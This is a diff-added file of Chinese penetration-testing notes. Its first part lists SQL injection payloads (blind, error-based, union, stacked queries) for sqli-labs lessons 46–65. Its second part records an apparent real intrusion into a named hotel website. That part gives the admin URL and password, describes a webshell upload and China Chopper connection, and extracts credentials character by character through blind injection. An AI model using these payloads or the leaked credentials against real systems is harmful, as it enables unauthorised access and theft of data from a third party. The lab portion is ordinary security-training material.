+输入id：sort=1 and if(length(database())=8,sleep(0),sleep(5))
+输入id：sort=1 and sleep(if(length(database())=8,0,5))
+
+sort=1 and updatexml(1,concat(0x23,database()),1)%23
+sort=1 and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema='security')),1)
+ 
+less-47  同46
+$sql = "SELECT * FROM users ORDER BY '$id'"
+print_r(mysql_error());
+sort=1' and (length(database())) =8 and if(1=1,null,sleep(5))%23
+sort=1' and 1=2 union select 1,2,3%23
+
+less-48  时间型盲注
+sql = "SELECT * FROM users ORDER BY $id"
+sort=1 and if(length(database())=8,sleep(0),sleep(5))%23
+
+less-49  同48
+sql = "SELECT * FROM users ORDER BY '$id'";
+
+less-50
+print_r(mysqli_error($con1));
+multi_query
+$sql="SELECT * FROM users ORDER BY $id";
+sort=1;insert into users(username,password) values('hi','hi')%23
+sort=1 and updatexml(1,concat(0x23,database()),1)%23
+
+less-51
+print_r(mysqli_error($con1));
+mysqli_multi_query
+sql="SELECT * FROM users ORDER BY '$id'"
+sort=1' and updatexml(1,concat(0x23,database()),1)%23
+
+less-52
+mysqli_multi_query
+$sql="SELECT * FROM users ORDER BY $id";
+sort=1;insert into users(username,password) values('hi','hi')%23
+
+less-53
+sql="SELECT * FROM users ORDER BY '$id'";
+mysqli_multi_query
+
+less-54
+sql="SELECT * FROM security.users WHERE id='$id' LIMIT 0,1"
+$times= 10;
+?id=-1' union select 1,2,3%23
+?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='challenges'%23
+?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='challenges' and   table_name='4x3x0d3pws'%23
+sessid,secret_SLGF,tryy
+?id=-1' union select 1,group_concat(secret_SLGF),3 from jeq709ugyv%23
+IV1XvrxeQXkN9zTvuBj14bds
+
+less-55
+times= 14;
+sql="SELECT * FROM security.users WHERE id=($id) LIMIT 0,1"
+?id=-1) union select 1,2,3%23
+
+less-56
+sql="SELECT * FROM security.users WHERE id=('$id') LIMIT 0,1"
+?id=-1') union select 1,2,database()%23
+
+less-57
+id= '"'.$id.'"'
+sql="SELECT * FROM security.users WHERE id=$id LIMIT 0,1"
+?id=-1" union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='challenges'%23
+?id=-1" union select 1,group_concat(secret_SLGF),3 from jeq709ugyv%23
+
+less-58 不能联合查询，要报错  echo "sql:".$sql;
+sql="SELECT * FROM security.users WHERE id='$id' LIMIT 0,1"
+sessid=$_COOKIE['challenge']
+?id=1'or updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where  table_schema='challenges')),1) or '1
+?id=1' and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema='challenges')),1)%23
+
+less-59 不能联合查询，要报错
+sql="SELECT * FROM security.users WHERE id=$id LIMIT 0,1"
+?id=1 and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where  table_schema='challenges')),1)%23
+
+less-60
+id = '("'.$id.'")' id周围是双引号和一层括号
+sql="SELECT * FROM security.users WHERE id=$id LIMIT 0,1"
+?id=1") and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where  table_schema='challenges')),1)%23
+1") and updatexml(1,concat(0x23,database()),1)%23
+
+less-61
+sql="SELECT * FROM security.users WHERE id=(('$id')) LIMIT 0,1";
+?id=1')) and updatexml(1,concat(0x23,database()),1)%23
+
+less-62   时间型盲注  盲注  没有显示位
+sql="SELECT * FROM security.users WHERE id=('$id') LIMIT 0,1"
+输入id：1') and sleep(if(length(database())>10,0,5)) %23
+
+less-63 同62
+sql="SELECT * FROM security.users WHERE id='$id' LIMIT 0,1"
+
+less-64 同62
+sql="SELECT * FROM security.users WHERE id=(($id)) LIMIT 0,1"
+
+less-65  没有显示位
+$id = '"'.$id.'"'; id周围是双引号和一层括号
+$sql="SELECT * FROM security.users WHERE id=($id) LIMIT 0,1"
+?id=1") union select 1,2,3 %23
+
+
+注：随机值 
+表名 10位 由 小写字母和数字 组成 
+secret_XXXX 后四位由 大写字母和数字 组成 
+key 24位 由 大小写字母和数字 组成
+
+
+
+漏洞提交平台：https://www.vulbox.com/bounties
+18:14:41
+乐洪舟 2018/8/3 18:14:41
+乌云网镜像：
+http://www.anquan.us/search?keywords=&content_search_by=by_bugs
+
+渗透实例http://sabeanhotel.com/
+http://sabeanhotel.com/admin/              
+管理员:admin 密码：pass789
+在photo处上传a.php
+菜刀连接，在/home/sabeanho/public_html/下找到dbconn.php
+在数据库管理中配置
+
+渗透笔记
+x_arrivaldate输入：1' or updatexml(1,concat(0x7e,(database())),0) or '1'='1  爆出数据库sabeanho_dbhotel
+
+x_arrivaldate输入：1' or updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema='gmaecco_gmaecsell')),1) or '1'='1
+爆不出表名，说明有防火墙的防护
+
+x_arrivaldate输入：1' or updatexml(1,concat(0x7e,(select username from user)),0) or '1'='1 未报错，说明存在user表
+
+x_arrivaldate输入：1' or updatexml(1,concat(0x7e,(select group_concat(username,0x23,password) from user)),0) or '1'='1 未报错，说明存在username,password列
+
+http://sabeanhotel.com/rooms.php?rtid=5 and (select count(username) from user)=1%23 正确，说明user表中只有一个用户
+
+http://sabeanhotel.com/rooms.php?rtid=5 and (select username from user)='admin'%23 报防火墙的报警信息，说明有防火墙的防护
+
+http://sabeanhotel.com/rooms.php?rtid=5 and (select length(username) from user)=5%23  正确，说明username有5个字符
+
+http://sabeanhotel.com/rooms.php?rtid=5 and (select substr(username,1,1) from user)='a'%23 正确，说明username的第一个字母为a
+以此类推，可以知道username为admin
+
+http://sabeanhotel.com/rooms.php?rtid=5 and (select length(password) from user)=7%23  正确，说明密码有7个字符
+
+http://sabeanhotel.com/rooms.php?rtid=5 and ascii(substr((select substr(password,1,1) from user limit 0,1),1,1))=112%23 正确，说明第一个字母是p
+
+http://sabeanhotel.com/rooms.php?rtid=5 and ascii(substr((select substr(password,2,1) from user limit 0,1),1,1))=97%23 正确，说明第二个字母是a
+
+http://sabeanhotel.com/rooms.php?rtid=5 and ascii(substr((select substr(password,3,1) from user limit 0,1),1,1))=115%23 正确，说明第三个字母是s
+
+http://sabeanhotel.com/rooms.php?rtid=5 and ascii(substr((select substr(password,4,1) from user limit 0,1),1,1))=115%23 正确，说明第四个字母是s
+
+http://sabeanhotel.com/rooms.php?rtid=5 and ascii(substr((select substr(password,5,1) from user limit 0,1),1,1))=55%23 正确，说明第五个字母是7
+
+http://sabeanhotel.com/rooms.php?rtid=5 and ascii(substr((select substr(password,6,1) from user limit 0,1),1,1))=56%23 正确，说明第六个字母是8
+
+http://sabeanhotel.com/rooms.php?rtid=5 and ascii(substr((select substr(password,7,1) from user limit 0,1),1,1))=57%23 正确，说明第七个字母是9
+
+因此，密码为pass789
+
+
